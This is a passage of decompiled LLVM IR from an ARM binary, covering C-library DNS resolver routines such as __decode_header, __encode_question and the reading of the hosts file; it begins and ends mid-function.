  %v0_2fa34 = load i32, i32* @ip, align 4
  %v1_2fa34 = add i32 %v0_2fa34, 33
  %v2_2fa34 = inttoptr i32 %v1_2fa34 to i8*
  %v3_2fa34 = load i8, i8* %v2_2fa34, align 1
  %v2_2fa38 = load i32, i32* %lr.global-to-local, align 4
  %v3_2fa38 = add i32 %v2_2fa38, 4
  %v4_2fa38 = inttoptr i32 %v3_2fa38 to i8*
  store i8 %v3_2fa34, i8* %v4_2fa38, align 1
  %v0_2fa3c = load i32, i32* @ip, align 4
  %v1_2fa3c = add i32 %v0_2fa3c, 32
  %v2_2fa3c = inttoptr i32 %v1_2fa3c to i32*
  %v3_2fa3c = load i32, i32* %v2_2fa3c, align 4
  %v1_2fa40 = trunc i32 %v3_2fa3c to i8
  %v2_2fa40 = load i32, i32* %lr.global-to-local, align 4
  %v3_2fa40 = add i32 %v2_2fa40, 5
  %v4_2fa40 = inttoptr i32 %v3_2fa40 to i8*
  store i8 %v1_2fa40, i8* %v4_2fa40, align 1
  %v0_2fa44 = load i32, i32* @ip, align 4
  %v1_2fa44 = add i32 %v0_2fa44, 37
  %v2_2fa44 = inttoptr i32 %v1_2fa44 to i8*
  %v3_2fa44 = load i8, i8* %v2_2fa44, align 1
  %v2_2fa48 = load i32, i32* %lr.global-to-local, align 4
  %v3_2fa48 = add i32 %v2_2fa48, 6
  %v4_2fa48 = inttoptr i32 %v3_2fa48 to i8*
  store i8 %v3_2fa44, i8* %v4_2fa48, align 1
  %v0_2fa4c = load i32, i32* @ip, align 4
  %v1_2fa4c = add i32 %v0_2fa4c, 36
  %v2_2fa4c = inttoptr i32 %v1_2fa4c to i32*
  %v3_2fa4c = load i32, i32* %v2_2fa4c, align 4
  %v1_2fa50 = trunc i32 %v3_2fa4c to i8
  %v2_2fa50 = load i32, i32* %lr.global-to-local, align 4
  %v3_2fa50 = add i32 %v2_2fa50, 7
  %v4_2fa50 = inttoptr i32 %v3_2fa50 to i8*
  store i8 %v1_2fa50, i8* %v4_2fa50, align 1
  %v0_2fa54 = load i32, i32* @ip, align 4
  %v1_2fa54 = add i32 %v0_2fa54, 41
  %v2_2fa54 = inttoptr i32 %v1_2fa54 to i8*
  %v3_2fa54 = load i8, i8* %v2_2fa54, align 1
  %v2_2fa58 = load i32, i32* %lr.global-to-local, align 4
  %v3_2fa58 = add i32 %v2_2fa58, 8
  %v4_2fa58 = inttoptr i32 %v3_2fa58 to i8*
  store i8 %v3_2fa54, i8* %v4_2fa58, align 1
  %v0_2fa5c = load i32, i32* @ip, align 4
  %v1_2fa5c = add i32 %v0_2fa5c, 40
  %v2_2fa5c = inttoptr i32 %v1_2fa5c to i32*
  %v3_2fa5c = load i32, i32* %v2_2fa5c, align 4
  %v1_2fa60 = trunc i32 %v3_2fa5c to i8
  %v2_2fa60 = load i32, i32* %lr.global-to-local, align 4
  %v3_2fa60 = add i32 %v2_2fa60, 9
  %v4_2fa60 = inttoptr i32 %v3_2fa60 to i8*
  store i8 %v1_2fa60, i8* %v4_2fa60, align 1
  %v0_2fa64 = load i32, i32* @ip, align 4
  %v1_2fa64 = add i32 %v0_2fa64, 45
  %v2_2fa64 = inttoptr i32 %v1_2fa64 to i8*
  %v3_2fa64 = load i8, i8* %v2_2fa64, align 1
  %v2_2fa68 = load i32, i32* %lr.global-to-local, align 4
  %v3_2fa68 = add i32 %v2_2fa68, 10
  %v4_2fa68 = inttoptr i32 %v3_2fa68 to i8*
  store i8 %v3_2fa64, i8* %v4_2fa68, align 1
  %v0_2fa6c = load i32, i32* @ip, align 4
  %v1_2fa6c = add i32 %v0_2fa6c, 44
  %v2_2fa6c = inttoptr i32 %v1_2fa6c to i32*
  %v3_2fa6c = load i32, i32* %v2_2fa6c, align 4
  %v1_2fa70 = trunc i32 %v3_2fa6c to i8
  %v2_2fa70 = load i32, i32* %lr.global-to-local, align 4
  %v3_2fa70 = add i32 %v2_2fa70, 11
  %v4_2fa70 = inttoptr i32 %v3_2fa70 to i8*
  store i8 %v1_2fa70, i8* %v4_2fa70, align 1
  %v2_2fa78.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_2fa78

dec_label_pc_2fa78:                               ; preds = %entry, %bb17
  %v2_2fa78 = phi i32 [ %v2_2fa78.pre, %bb17 ], [ %v0_2f998, %entry ]
  %storemerge = phi i32 [ 12, %bb17 ], [ -1, %entry ]
  store i32 %v2_2fa78, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_2f9bc, { 0, 2, 1, 3, 4 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 45, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 2, 0, 3, 4, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_2fa78, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_2fa80 = load i8, i8* %arg1, align 1
  %v4_2fa80 = zext i8 %v3_2fa80 to i32
  %v2_2fa84 = add i32 %tmp, 1
  %v3_2fa84 = inttoptr i32 %v2_2fa84 to i8*
  %v4_2fa84 = load i8, i8* %v3_2fa84, align 1
  %v5_2fa84 = zext i8 %v4_2fa84 to i32
  %v4_2fa88 = mul nuw nsw i32 %v4_2fa80, 256
  %v5_2fa88 = or i32 %v5_2fa84, %v4_2fa88
  %v2_2fa8c = inttoptr i32 %arg2 to i32*
  store i32 %v5_2fa88, i32* %v2_2fa8c, align 4
  %v2_2fa90 = add i32 %tmp, 2
  %v3_2fa90 = inttoptr i32 %v2_2fa90 to i8*
  %v4_2fa90 = load i8, i8* %v3_2fa90, align 1
  %tmp3 = icmp slt i8 %v4_2fa90, 0
  %v3_2fa94 = zext i1 %tmp3 to i32
  %v2_2fa98 = add i32 %arg2, 4
  %v3_2fa98 = inttoptr i32 %v2_2fa98 to i32*
  store i32 %v3_2fa94, i32* %v3_2fa98, align 4
  %v4_2fa9c = load i8, i8* %v3_2fa90, align 1
  %div = udiv i8 %v4_2fa9c, 8
  %tmp4 = urem i8 %div, 16
  %v1_2faa4 = zext i8 %tmp4 to i32
  %v2_2faa8 = add i32 %arg2, 8
  %v3_2faa8 = inttoptr i32 %v2_2faa8 to i32*
  store i32 %v1_2faa4, i32* %v3_2faa8, align 4
  %v4_2faac = load i8, i8* %v3_2fa90, align 1
  %div1 = udiv i8 %v4_2faac, 4
  %tmp5 = urem i8 %div1, 2
  %v1_2fab4 = zext i8 %tmp5 to i32
  %v2_2fab8 = add i32 %arg2, 12
  %v3_2fab8 = inttoptr i32 %v2_2fab8 to i32*
  store i32 %v1_2fab4, i32* %v3_2fab8, align 4
  %v4_2fabc = load i8, i8* %v3_2fa90, align 1
  %div2 = udiv i8 %v4_2fabc, 2
  %tmp6 = urem i8 %div2, 2
  %v1_2fac4 = zext i8 %tmp6 to i32
  %v2_2fac8 = add i32 %arg2, 16
  %v3_2fac8 = inttoptr i32 %v2_2fac8 to i32*
  store i32 %v1_2fac4, i32* %v3_2fac8, align 4
  %v4_2facc = load i8, i8* %v3_2fa90, align 1
  %tmp7 = urem i8 %v4_2facc, 2
  %v1_2fad0 = zext i8 %tmp7 to i32
  %v2_2fad4 = add i32 %arg2, 20
  %v3_2fad4 = inttoptr i32 %v2_2fad4 to i32*
  store i32 %v1_2fad0, i32* %v3_2fad4, align 4
  %v2_2fad8 = add i32 %tmp, 3
  %v3_2fad8 = inttoptr i32 %v2_2fad8 to i8*
  %v4_2fad8 = load i8, i8* %v3_2fad8, align 1
  %tmp8 = icmp slt i8 %v4_2fad8, 0
  %v3_2fadc = zext i1 %tmp8 to i32
  %v2_2fae0 = add i32 %arg2, 24
  %v3_2fae0 = inttoptr i32 %v2_2fae0 to i32*
  store i32 %v3_2fadc, i32* %v3_2fae0, align 4
  %v4_2fae4 = load i8, i8* %v3_2fad8, align 1
  %tmp9 = urem i8 %v4_2fae4, 16
  %v1_2fae8 = zext i8 %tmp9 to i32
  %v2_2faec = add i32 %arg2, 28
  %v3_2faec = inttoptr i32 %v2_2faec to i32*
  store i32 %v1_2fae8, i32* %v3_2faec, align 4
  %v2_2faf0 = add i32 %tmp, 4
  %v3_2faf0 = inttoptr i32 %v2_2faf0 to i8*
  %v4_2faf0 = load i8, i8* %v3_2faf0, align 1
  %v5_2faf0 = zext i8 %v4_2faf0 to i32
  %v2_2faf4 = add i32 %tmp, 5
  %v3_2faf4 = inttoptr i32 %v2_2faf4 to i8*
  %v4_2faf4 = load i8, i8* %v3_2faf4, align 1
  %v5_2faf4 = zext i8 %v4_2faf4 to i32
  %v4_2faf8 = mul nuw nsw i32 %v5_2faf0, 256
  %v5_2faf8 = or i32 %v5_2faf4, %v4_2faf8
  %v2_2fafc = add i32 %arg2, 32
  %v3_2fafc = inttoptr i32 %v2_2fafc to i32*
  store i32 %v5_2faf8, i32* %v3_2fafc, align 4
  %v2_2fb00 = add i32 %tmp, 6
  %v3_2fb00 = inttoptr i32 %v2_2fb00 to i8*
  %v4_2fb00 = load i8, i8* %v3_2fb00, align 1
  %v5_2fb00 = zext i8 %v4_2fb00 to i32
  %v2_2fb04 = add i32 %tmp, 7
  %v3_2fb04 = inttoptr i32 %v2_2fb04 to i8*
  %v4_2fb04 = load i8, i8* %v3_2fb04, align 1
  %v5_2fb04 = zext i8 %v4_2fb04 to i32
  %v4_2fb08 = mul nuw nsw i32 %v5_2fb00, 256
  %v5_2fb08 = or i32 %v5_2fb04, %v4_2fb08
  %v2_2fb0c = add i32 %arg2, 36
  %v3_2fb0c = inttoptr i32 %v2_2fb0c to i32*
  store i32 %v5_2fb08, i32* %v3_2fb0c, align 4
  %v2_2fb10 = add i32 %tmp, 8
  %v3_2fb10 = inttoptr i32 %v2_2fb10 to i8*
  %v4_2fb10 = load i8, i8* %v3_2fb10, align 1
  %v5_2fb10 = zext i8 %v4_2fb10 to i32
  %v2_2fb14 = add i32 %tmp, 9
  %v3_2fb14 = inttoptr i32 %v2_2fb14 to i8*
  %v4_2fb14 = load i8, i8* %v3_2fb14, align 1
  %v5_2fb14 = zext i8 %v4_2fb14 to i32
  %v4_2fb18 = mul nuw nsw i32 %v5_2fb10, 256
  %v5_2fb18 = or i32 %v5_2fb14, %v4_2fb18
  %v2_2fb1c = add i32 %arg2, 40
  %v3_2fb1c = inttoptr i32 %v2_2fb1c to i32*
  store i32 %v5_2fb18, i32* %v3_2fb1c, align 4
  %v2_2fb20 = add i32 %tmp, 11
  %v3_2fb20 = inttoptr i32 %v2_2fb20 to i8*
  %v4_2fb20 = load i8, i8* %v3_2fb20, align 1
  %v5_2fb20 = zext i8 %v4_2fb20 to i32
  %v2_2fb24 = add i32 %tmp, 10
  %v3_2fb24 = inttoptr i32 %v2_2fb24 to i8*
  %v4_2fb24 = load i8, i8* %v3_2fb24, align 1
  %v5_2fb24 = zext i8 %v4_2fb24 to i32
  %v4_2fb28 = mul nuw nsw i32 %v5_2fb24, 256
  %v5_2fb28 = or i32 %v4_2fb28, %v5_2fb20
  %v2_2fb2c = add i32 %arg2, 44
  %v3_2fb2c = inttoptr i32 %v2_2fb2c to i32*
  store i32 %v5_2fb28, i32* %v3_2fb2c, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 11, { 13, 14, 7, 8, 15, 9, 10, 11, 16, 24, 17, 4, 5, 6, 18, 19, 20, 21, 22, 23, 0, 3, 2, 1, 12 }
  uselistorder i8 2, { 1, 2, 3, 4, 0, 6, 5 }
  uselistorder i8 4, { 2, 0, 1, 3 }
  uselistorder i8 16, { 1, 2, 0, 3 }
  uselistorder i8 8, { 1, 0 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_2fb34 = load i32, i32* @r4, align 4
  store i32 %v3_2fb34, i32* %stack_var_-16, align 4
  %v9_2fb34 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_2fb3c = load i32, i32* %arg1, align 4
  store i32 %v2_2fb3c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  %v1_2fb48 = inttoptr i32 %v2_2fb3c to i8*
  %v2_2fb48 = call i32 @__encode_dotted(i8* %v1_2fb48)
  store i32 %v2_2fb48, i32* %r0.global-to-local, align 4
  %v1_2fb4c = icmp slt i32 %v2_2fb48, 0
  br i1 %v1_2fb4c, label %dec_label_pc_2fb8c, label %dec_label_pc_2fb54

dec_label_pc_2fb54:                               ; preds = %entry
  %v1_2fb54 = load i32, i32* @r5, align 4
  %v2_2fb54 = sub i32 %v1_2fb54, %v2_2fb48
  %v7_2fb5c = icmp slt i32 %v2_2fb54, 4
  br i1 %v7_2fb5c, label %bb, label %dec_label_pc_2fb64

bb:                                               ; preds = %dec_label_pc_2fb54
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2fb8c

dec_label_pc_2fb64:                               ; preds = %dec_label_pc_2fb54
  %v0_2fb64 = load i32, i32* @r4, align 4
  %v1_2fb64 = add i32 %v0_2fb64, 5
  %v2_2fb64 = inttoptr i32 %v1_2fb64 to i8*
  %v3_2fb64 = load i8, i8* %v2_2fb64, align 1
  %v2_2fb68 = load i32, i32* @r6, align 4
  %v4_2fb68 = add i32 %v2_2fb68, %v2_2fb48
  %v5_2fb68 = inttoptr i32 %v4_2fb68 to i8*
  store i8 %v3_2fb64, i8* %v5_2fb68, align 1
  %v0_2fb6c = load i32, i32* @r4, align 4
  %v1_2fb6c = add i32 %v0_2fb6c, 4
  %v2_2fb6c = inttoptr i32 %v1_2fb6c to i32*
  %v3_2fb6c = load i32, i32* %v2_2fb6c, align 4
  %v0_2fb70 = load i32, i32* @r6, align 4
  %v1_2fb70 = load i32, i32* %r0.global-to-local, align 4
  %v2_2fb70 = add i32 %v1_2fb70, %v0_2fb70
  store i32 %v2_2fb70, i32* %r2.global-to-local, align 4
  %v1_2fb74 = trunc i32 %v3_2fb6c to i8
  %v3_2fb74 = add i32 %v2_2fb70, 1
  %v4_2fb74 = inttoptr i32 %v3_2fb74 to i8*
  store i8 %v1_2fb74, i8* %v4_2fb74, align 1
  %v0_2fb78 = load i32, i32* @r4, align 4
  %v1_2fb78 = add i32 %v0_2fb78, 9
  %v2_2fb78 = inttoptr i32 %v1_2fb78 to i8*
  %v3_2fb78 = load i8, i8* %v2_2fb78, align 1
  %v2_2fb7c = load i32, i32* %r2.global-to-local, align 4
  %v3_2fb7c = add i32 %v2_2fb7c, 2
  %v4_2fb7c = inttoptr i32 %v3_2fb7c to i8*
  store i8 %v3_2fb78, i8* %v4_2fb7c, align 1
  %v0_2fb80 = load i32, i32* @r4, align 4
  %v1_2fb80 = add i32 %v0_2fb80, 8
  %v2_2fb80 = inttoptr i32 %v1_2fb80 to i32*
  %v3_2fb80 = load i32, i32* %v2_2fb80, align 4
  %v1_2fb84 = trunc i32 %v3_2fb80 to i8
  %v2_2fb84 = load i32, i32* %r2.global-to-local, align 4
  %v3_2fb84 = add i32 %v2_2fb84, 3
  %v4_2fb84 = inttoptr i32 %v3_2fb84 to i8*
  store i8 %v1_2fb84, i8* %v4_2fb84, align 1
  %v0_2fb88 = load i32, i32* %r0.global-to-local, align 4
  %v1_2fb88 = add i32 %v0_2fb88, 4
  store i32 %v1_2fb88, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2fb8c

dec_label_pc_2fb8c:                               ; preds = %bb, %entry, %dec_label_pc_2fb64
  %v1_2fb90 = phi i32 [ -1, %bb ], [ %v2_2fb48, %entry ], [ %v1_2fb88, %dec_label_pc_2fb64 ]
  %v2_2fb8c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2fb8c, i32* @r4, align 4
  store i32 %v9_2fb34, i32* @r6, align 4
  ret i32 %v1_2fb90

; uselistorder directives
  uselistorder i32 %v2_2fb48, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 5, 2, 6, 3, 0 }
  uselistorder label %dec_label_pc_2fb8c, { 2, 0, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33132), i32* @r0, align 4
  %v1_2fbac = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33132))
  ret i32 %v1_2fbac

; uselistorder directives
  uselistorder i32 (i32)* @__GI_config_open, { 0, 2, 1 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_2fbc4 = load i32, i32* @r4, align 4
  %v9_2fbc4 = load i32, i32* @r6, align 4
  %v12_2fbc4 = load i32, i32* @r7, align 4
  %v15_2fbc4 = load i32, i32* @r8, align 4
  %v18_2fbc4 = load i32, i32* @sb, align 4
  %v24_2fbc4 = load i32, i32* @fp, align 4
  store i32 %tmp10, i32* @r5, align 4
  store i32 %tmp9, i32* @lr, align 4
  store i32 -1, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r4, align 4
  %v2_2fbe4 = inttoptr i32 %tmp9 to i32*
  store i32 -1, i32* %v2_2fbe4, align 4
  %v0_2fbe8 = load i32, i32* @r0, align 4
  store i32 %v0_2fbe8, i32* @r6, align 4
  %v0_2fbec = load i32, i32* @r1, align 4
  %v0_2fbf0 = load i32, i32* @r2, align 4
  store i32 %v0_2fbf0, i32* @r8, align 4
  %v0_2fbf4 = load i32, i32* @r3, align 4
  store i32 %v0_2fbf4, i32* @fp, align 4
  %v3_2fbf8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_2fbf8, i32* @r7, align 4
  %tmp = icmp ult i32 %tmp10, 129
  br i1 %tmp, label %.thread, label %dec_label_pc_2fc04

.thread:                                          ; preds = %entry
  store i32 34, i32* @sb, align 4
  br label %dec_label_pc_2fdbc

dec_label_pc_2fc04:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_2fc08 = icmp eq i32 %v0_2fbe8, 0
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_2fc08, label %dec_label_pc_2fc14, label %dec_label_pc_2fc3c

dec_label_pc_2fc14:                               ; preds = %dec_label_pc_2fc04
  %v0_2fc14 = call i32 @__open_etc_hosts()
  store i32 %v0_2fc14, i32* @r6, align 4
  %v2_2fc18 = icmp eq i32 %v0_2fc14, 0
  br i1 %v2_2fc18, label %dec_label_pc_2fc20, label %dec_label_pc_2fc3c

dec_label_pc_2fc20:                               ; preds = %dec_label_pc_2fc14
  store i32 %tmp7, i32* %r2.global-to-local, align 4
  store i32 77052, i32* %r3.global-to-local, align 4
  %v2_2fc28 = inttoptr i32 %tmp7 to i32*
  store i32 0, i32* %v2_2fc28, align 4
  %v0_2fc2c = call i32 @__aeabi_read_tp()
  %v3_2fc30 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2fc30 = sext i16 %v3_2fc30 to i32
  store i32 %v4_2fc30, i32* %r3.global-to-local, align 4
  %v2_2fc34 = add i32 %v4_2fc30, %v0_2fc2c
  %v3_2fc34 = inttoptr i32 %v2_2fc34 to i32*
  %v4_2fc34 = load i32, i32* %v3_2fc34, align 4
  store i32 %v4_2fc34, i32* @sb, align 4
  br label %dec_label_pc_2fdbc

dec_label_pc_2fc3c:                               ; preds = %dec_label_pc_2fc14, %dec_label_pc_2fc04
  %v1_2fc5c = phi i32 [ %v0_2fc14, %dec_label_pc_2fc14 ], [ %v0_2fbe8, %dec_label_pc_2fc04 ]
  %v0_2fc40 = load i32, i32* @r4, align 4
  %v2_2fc40 = add i32 %v0_2fc40, -33120
  store i32 %v2_2fc40, i32* @r4, align 4
  %v2_2fc44 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %tmp6, i32* %ip.global-to-local, align 4
  store i32 %tmp6, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_2fc5c = add i32 %v1_2fc5c, 8
  %v3_2fc5c = inttoptr i32 %v2_2fc5c to i32*
  store i32 48, i32* %v3_2fc5c, align 4
  store i32 %tmp9, i32* %r3.global-to-local, align 4
  %v0_2fc64 = load i32, i32* @r5, align 4
  %v1_2fc64 = add i32 %v0_2fc64, -48
  store i32 %v1_2fc64, i32* %r1.global-to-local, align 4
  %v0_2fc68 = load i32, i32* %ip.global-to-local, align 4
  %v1_2fc68 = add i32 %v0_2fc68, 24
  store i32 %v1_2fc68, i32* @ip, align 4
  %v0_2fc6c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_2fc6c, i32* @sb, align 4
  %v0_2fc70 = load i32, i32* @lr, align 4
  %v1_2fc70 = add i32 %v0_2fc70, 32
  store i32 %v1_2fc70, i32* @sl, align 4
  %v1_2fc74 = load i32, i32* @r6, align 4
  %v2_2fc74 = add i32 %v1_2fc74, 16
  %v3_2fc74 = inttoptr i32 %v2_2fc74 to i32*
  store i32 %v1_2fc64, i32* %v3_2fc74, align 4
  %v0_2fc78 = load i32, i32* @r4, align 4
  %v0_2fc7c = load i32, i32* @ip, align 4
  store i32 %v0_2fc7c, i32* %stack_var_-64, align 4
  %v0_2fc80 = load i32, i32* %r2.global-to-local, align 4
  %v1_2fc80 = load i32, i32* %r3.global-to-local, align 4
  %v2_2fc80 = inttoptr i32 %v1_2fc80 to i32*
  store i32 %v0_2fc80, i32* %v2_2fc80, align 4
  %v0_2fc84 = load i32, i32* @lr, align 4
  %v1_2fc84 = load i32, i32* @r6, align 4
  %v2_2fc84 = add i32 %v1_2fc84, 4
  %v3_2fc84 = inttoptr i32 %v2_2fc84 to i32*
  store i32 %v0_2fc84, i32* %v3_2fc84, align 4
  %v2_2fcb4 = inttoptr i32 %v0_2fbec to i8*
  br label %dec_label_pc_2fd90

dec_label_pc_2fc8c:                               ; preds = %dec_label_pc_2fd90
  %v3_2fc8c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_2fc8c, i32* %r1.global-to-local, align 4
  %v0_2fc90 = load i32, i32* @fp, align 4
  %v7_2fc90 = icmp eq i32 %v0_2fc90, 1
  %v1_2fc94 = add i32 %v3_2fc8c, 4
  store i32 %v1_2fc94, i32* @r5, align 4
  %v1_2fc98 = load i32, i32* @r7, align 4
  %v2_2fc98 = add i32 %v1_2fc98, 4
  %v3_2fc98 = inttoptr i32 %v2_2fc98 to i32*
  store i32 %v1_2fc94, i32* %v3_2fc98, align 4
  br i1 %v7_2fc90, label %dec_label_pc_2fdbc, label %dec_label_pc_2fca0

dec_label_pc_2fca0:                               ; preds = %dec_label_pc_2fc8c
  %v0_2fca0 = load i32, i32* @fp, align 4
  %v7_2fca0 = icmp eq i32 %v0_2fca0, 2
  br i1 %v7_2fca0, label %dec_label_pc_2fcac, label %dec_label_pc_2fce0.preheader

dec_label_pc_2fce0.preheader:                     ; preds = %dec_label_pc_2fca0
  br label %dec_label_pc_2fcc4

dec_label_pc_2fcac:                               ; preds = %dec_label_pc_2fca0
  %v0_2fcac = load i32, i32* %r1.global-to-local, align 4
  %v1_2fcac = inttoptr i32 %v0_2fcac to i32*
  %v2_2fcac = load i32, i32* %v1_2fcac, align 4
  store i32 %v2_2fcac, i32* @r1, align 4
  %v3_2fcb4 = call i32 @__GI_strcoll(i8* %v2_2fcb4, i32 %v2_2fcac)
  %v2_2fcb8 = icmp eq i32 %v3_2fcb4, 0
  br i1 %v2_2fcb8, label %dec_label_pc_2fcf0, label %dec_label_pc_2fd90

dec_label_pc_2fcc4:                               ; preds = %dec_label_pc_2fce0.preheader, %dec_label_pc_2fce0.backedge
  %v0_2fccc = phi i32 [ 0, %dec_label_pc_2fce0.preheader ], [ %v0_2fce0.be, %dec_label_pc_2fce0.backedge ]
  %v0_2fcc4 = load i32, i32* @r5, align 4
  %v4_2fcc4 = mul i32 %v0_2fccc, 4
  %v5_2fcc4 = add i32 %v4_2fcc4, %v0_2fcc4
  %v6_2fcc4 = inttoptr i32 %v5_2fcc4 to i32*
  %v7_2fcc4 = load i32, i32* %v6_2fcc4, align 4
  store i32 %v7_2fcc4, i32* %r3.global-to-local, align 4
  store i32 %v7_2fcc4, i32* %r1.global-to-local, align 4
  %v2_2fcc8 = icmp eq i32 %v7_2fcc4, 0
  %v1_2fccc = add i32 %v0_2fccc, 1
  store i32 %v1_2fccc, i32* @r4, align 4
  br i1 %v2_2fcc8, label %dec_label_pc_2fce0.backedge, label %dec_label_pc_2fcd4

dec_label_pc_2fce0.backedge:                      ; preds = %dec_label_pc_2fcc4, %dec_label_pc_2fce0thread-pre-split
  %v0_2fce0.be = phi i32 [ %v0_2fce0.pr, %dec_label_pc_2fce0thread-pre-split ], [ %v1_2fccc, %dec_label_pc_2fcc4 ]
  %v7_2fce8 = icmp sgt i32 %v0_2fce0.be, 3
  br i1 %v7_2fce8, label %dec_label_pc_2fd90, label %dec_label_pc_2fcc4

dec_label_pc_2fcd4:                               ; preds = %dec_label_pc_2fcc4
  %v3_2fcd4 = call i32 @__GI_strcasecmp(i8* %v2_2fcb4, i32 %v7_2fcc4)
  %v2_2fcd8 = icmp eq i32 %v3_2fcd4, 0
  br i1 %v2_2fcd8, label %dec_label_pc_2fcf0, label %dec_label_pc_2fce0thread-pre-split

dec_label_pc_2fce0thread-pre-split:               ; preds = %dec_label_pc_2fcd4
  %v0_2fce0.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_2fce0.backedge

dec_label_pc_2fcf0:                               ; preds = %dec_label_pc_2fcd4, %dec_label_pc_2fcac
  %v0_2fcf0 = load i32, i32* @r5, align 4
  %v1_2fcf0 = inttoptr i32 %v0_2fcf0 to i32*
  %v2_2fcf0 = load i32, i32* %v1_2fcf0, align 4
  store i32 %v2_2fcf0, i32* %r3.global-to-local, align 4
  %v4_2fcf0 = add i32 %v0_2fcf0, 4
  store i32 %v4_2fcf0, i32* @r5, align 4
  %v2_2fcf4 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_2fcf4, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v1_2fcfc = load i32, i32* @r7, align 4
  %v2_2fcfc = inttoptr i32 %v1_2fcfc to i32*
  store i32 %v2_2fcf0, i32* %v2_2fcfc, align 4
  %v0_2fd00 = load i32, i32* @lr, align 4
  %v1_2fd00 = load i32, i32* @ip, align 4
  %v2_2fd00 = add i32 %v1_2fd00, 4
  %v3_2fd00 = inttoptr i32 %v2_2fd00 to i32*
  store i32 %v0_2fd00, i32* %v3_2fd00, align 4
  store i32 %tmp6, i32* %r2.global-to-local, align 4
  %v0_2fd08 = load i32, i32* @r8, align 4
  %v7_2fd08 = icmp eq i32 %v0_2fd08, 2
  %v0_2fd0c = load i32, i32* @r5, align 4
  %v1_2fd0c = load i32, i32* @r7, align 4
  %v2_2fd0c = add i32 %v1_2fd0c, 4
  %v3_2fd0c = inttoptr i32 %v2_2fd0c to i32*
  store i32 %v0_2fd0c, i32* %v3_2fd0c, align 4
  %v0_2fd10 = load i32, i32* @ip, align 4
  %v1_2fd10 = load i32, i32* @r7, align 4
  %v2_2fd10 = add i32 %v1_2fd10, 16
  %v3_2fd10 = inttoptr i32 %v2_2fd10 to i32*
  store i32 %v0_2fd10, i32* %v3_2fd10, align 4
  %v0_2fd14 = load i32, i32* @sl, align 4
  %v1_2fd14 = load i32, i32* %r2.global-to-local, align 4
  %v2_2fd14 = add i32 %v1_2fd14, 24
  %v3_2fd14 = inttoptr i32 %v2_2fd14 to i32*
  store i32 %v0_2fd14, i32* %v3_2fd14, align 4
  br i1 %v7_2fd08, label %dec_label_pc_2fd1c, label %dec_label_pc_2fd4c

dec_label_pc_2fd1c:                               ; preds = %dec_label_pc_2fcf0
  %v3_2fd1c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_2fd1c, i32* %r3.global-to-local, align 4
  %v0_2fd20 = load i32, i32* @r8, align 4
  %v1_2fd24 = inttoptr i32 %v3_2fd1c to i32*
  %v2_2fd24 = load i32, i32* %v1_2fd24, align 4
  store i32 %v2_2fd24, i32* %r1.global-to-local, align 4
  %v0_2fd28 = load i32, i32* @sl, align 4
  store i32 %v0_2fd28, i32* %r2.global-to-local, align 4
  %v3_2fd2c = inttoptr i32 %v2_2fd24 to i8*
  %v4_2fd2c = call i32 @inet_pton(i32 %v0_2fd20, i8* %v3_2fd2c, i32 %v0_2fd28)
  %tmp23 = icmp slt i32 %v4_2fd2c, 1
  br i1 %tmp23, label %dec_label_pc_2fd8c, label %dec_label_pc_2fd38

dec_label_pc_2fd38:                               ; preds = %dec_label_pc_2fd1c
  %v0_2fd3c = load i32, i32* @r7, align 4
  %v2_2fd3c = inttoptr i32 %tmp7 to i32*
  store i32 %v0_2fd3c, i32* %v2_2fd3c, align 4
